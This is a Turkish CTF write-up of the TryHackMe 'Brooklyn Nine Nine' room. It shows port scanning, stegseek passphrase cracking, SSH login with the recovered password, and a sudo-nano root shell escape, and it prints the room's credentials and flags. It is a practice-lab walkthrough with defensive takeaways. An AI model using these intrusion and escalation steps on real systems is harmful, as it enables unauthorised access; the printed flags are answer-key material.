# 🚓 TryHackMe - Brooklyn Nine Nine CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Brooklyn_Nine_Nine-red.svg?style=flat-square&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg?style=flat-square)
![Category](https://img.shields.io/badge/Category-Steganography_%7C_Stegseek_%7C_GTFOBins-blue.svg?style=flat-square)

Bu doküman, TryHackMe platformundaki **Brooklyn Nine Nine** makinesinin web kaynak kodu incelemesi, **Stegseek** ile steganografi parolası kırma, SSH erişimi ve **GTFOBins** (`/bin/nano`) üzerinden `sudo` yetki yükseltme adımlarını içermektedir.

**Platform:** TryHackMe  
**Oda:** Brooklyn Nine Nine ([tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine))  
**Zorluk:** Kolay (Easy)  
**Kategori:** Web / Steganography / Linux Privilege Escalation (GTFOBins)  
**Hedef IP:** `10.112.162.238`

---

## 📑 İçindekiler

1. [Keşif & Port Taraması (Reconnaissance)](#1-keşif--port-taraması-reconnaissance)
2. [Web Keşfi, Kaynak Kod İncelemesi & Dizin Taraması](#2-web-keşfi-kaynak-kod-incelemesi--dizin-taraması)
3. [Stegseek ile Steganografi Parolasını Kırma](#3-stegseek-ile-steganografi-parolasını-kırma)
4. [SSH Erişimi & User Flag](#4-ssh-erişimi--user-flag)
5. [Yetki Yükseltme (`sudo /bin/nano`) & Root Flag](#5-yetki-yükseltme-sudo-binnano--root-flag)
6. [Özet Tablo & Çıkarımlar](#6-özet-tablo--çıkarımlar)
7. [Kaynaklar](#7-kaynaklar)

---

## 1. Keşif & Port Taraması (Reconnaissance)

Hedef makinedeki açık portları ve servis versiyonlarını tespit etmek için `nmap` taraması gerçekleştirildi:

```bash
nmap -sV -sC 10.112.162.238
```

**Açık Portlar:**
* `21/tcp` — **open** (FTP - vsftpd)
* `22/tcp` — **open** (SSH - OpenSSH)
* `80/tcp` — **open** (HTTP - Apache Web Sunucusu)

---

## 2. Web Keşfi, Kaynak Kod İncelemesi & Dizin Taraması

Tarayıcı üzerinden hedef web sayfasına gidildi:

```text
http://10.112.162.238
```

Sayfada tam ekran bir Brooklyn Nine-Nine görseli (`brooklyn99.jpg`) yer almaktadır. Görünürde başka bir etkileşim alanı bulunmadığından **Developer Tools (Sayfa Kaynağını Görüntüle)** açılarak HTML kaynak kodu incelendi ve yorum satırı içerisine gizlenmiş bir ipucu bulundu:

```html
<!-- Have you ever heard of steganography? -->
```

### Görselin İndirilmesi ve İlk Analiz
Sayfadaki görsel saldırgan makinesine (AttackBox) indirildi:

```bash
wget http://10.112.162.238/brooklyn99.jpg
```

Görsel `steghide` ile çözümlenmeye çalışıldığında bir parola (**passphrase**) istendiği görüldü. Olası bir parola ipucu bulmak amacıyla `gobuster` ile dizin taraması denendi:

```bash
gobuster dir -u http://10.112.162.238 -w /usr/share/wordlists/dirbuster/medium.txt -x php,html,txt,xml
```

Dizin taramasından ek bir dosya veya ipucu çıkmaması üzerine doğrudan görselin steganografi parolasını kırma aşamasına geçildi.

---

## 3. Stegseek ile Steganografi Parolasını Kırma

`steghide` ile gömülmüş verilerin parolasını yüksek hızda kırmak için **Stegseek** aracı ve `rockyou.txt` kelime listesi kullanıldı:

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

Stegseek parolayı saniyeler içinde kırarak gizli içeriği `brooklyn99.jpg.out` dosyasına çıkarttı. Çıktı dosyası `cat` ile okundu:

```bash
cat brooklyn99.jpg.out
```

**Çıkarılan İçerik:**

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Böylece **`holt`** kullanıcısının parolasının **`fluffydog12@ninenine`** olduğu öğrenildi.

> [!TIP]
> **Alternatif Giriş Yolu:** Bu makine iki farklı başlangıç senaryosu sunacak şekilde tasarlanmıştır. Steganografi yoluna alternatif olarak `21/ftp` portundaki anonim FTP sunucusundan alınan not ile `jake` kullanıcısına SSH brute-force da yapılabilmektedir; ancak `brooklyn99.jpg` üzerindeki Stegseek yöntemi doğrudan `holt` hesabına erişim sağlar.

---

## 4. SSH Erişimi & User Flag

Elde edilen kimlik bilgileri (`holt:fluffydog12@ninenine`) ile SSH sunucusuna giriş yapıldı ve `user.txt` bayrağı okundu:

```bash
ssh holt@10.112.162.238
# Parola: fluffydog12@ninenine
```

```bash
ls -la
cat user.txt
```

* **User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## 5. Yetki Yükseltme (`sudo /bin/nano`) & Root Flag

`root` bayrağını okumak için `holt` kullanıcısının `sudo` yetkileri kontrol edildi:

```bash
sudo -l
```

**Çıktı Analizi:**

```text
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

`holt` kullanıcısının `/bin/nano` metin düzenleyicisini parola girmeden `root` yetkisiyle çalıştırabildiği görüldü.

### GTFOBins ile `nano` İstismarı

[GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/#sudo) sayfasındaki yöntem izlenerek `nano` üzerinden alt kabuk (shell) çalıştırıldı:

1. Terminalde `nano` yönetici yetkisiyle başlatıldı:
   ```bash
   sudo /bin/nano
   ```
2. Editör ekranı açıldığında sırasıyla **`Ctrl + R`** ve ardından **`Ctrl + X`** tuş kombinasyonlarına basılarak komut çalıştırma (`Command to execute:`) satırı açıldı.
3. Aşağıdaki komut girilip `Enter` tuşuna basıldı:
   ```sh
   reset; sh 1>&0 2>&0
   ```

Elde edilen `root` kabuğu üzerinden `/root/root.txt` dosyası okunarak son bayrak ele geçirildi:

```bash
whoami
# root

cat /root/root.txt
```

* **Root Flag:** `63a9f0ea7bb98050796b649e85481845`

---

## 6. Özet Tablo & Çıkarımlar

| Aşama | Bulgular / Kullanılan Yöntem | Sonuç |
| :--- | :--- | :--- |
| **Port Taraması** | `nmap -sV -sC 10.112.162.238` | `21/ftp`, `22/ssh`, `80/http` açık |
| **Kaynak Kod Analizi** | `http://10.112.162.238` HTML yorum satırı | Steganografi ipucu (`brooklyn99.jpg`) |
| **Steganografi Kırma** | `stegseek brooklyn99.jpg rockyou.txt` | `holt` parolası: `fluffydog12@ninenine` |
| **User Flag** | `ssh holt@10.112.162.238` -> `cat user.txt` | `ee11cbb19052e40b07aac0ca060c23ee` |
| **Privilege Escalation** | `sudo /bin/nano` -> `Ctrl+R`, `Ctrl+X` -> `reset; sh 1>&0 2>&0` | `root` shell & `63a9f0ea7bb98050796b649e85481845` |

### Güvenlik Çıkarımları
1. **Steganografi Parolaları:** Görsellere `steghide` ile veri gömerken sözlükte yer alan zayıf parolalar kullanıldığında **Stegseek** saniyeler içinde milyonlarca adayı deneyerek veriyi çıkarabilmektedir.
2. **Metin Düzenleyicilere `sudo` Yetkisi Verme:** `nano`, `vim`, `vi`, `emacs` gibi etkileşimli metin düzenleyiciler dosya okuma/yazma ve harici komut çalıştırma özelliklerine sahip olduğundan kullanıcılara `sudo` ile tam yetkili olarak tanımlanmamalıdır (belirli tek bir dosya için gerekiyorsa `sudoedit` ve kısıtlı ortam değişkenleri değerlendirilmelidir).

---

## 7. Kaynaklar

- [TryHackMe — Brooklyn Nine Nine Odası](https://tryhackme.com/room/brooklynninenine)
- [Stegseek GitHub Repository](https://github.com/RickdeJager/stegseek)
- [GTFOBins — nano (Sudo)](https://gtfobins.github.io/gtfobins/nano/#sudo)

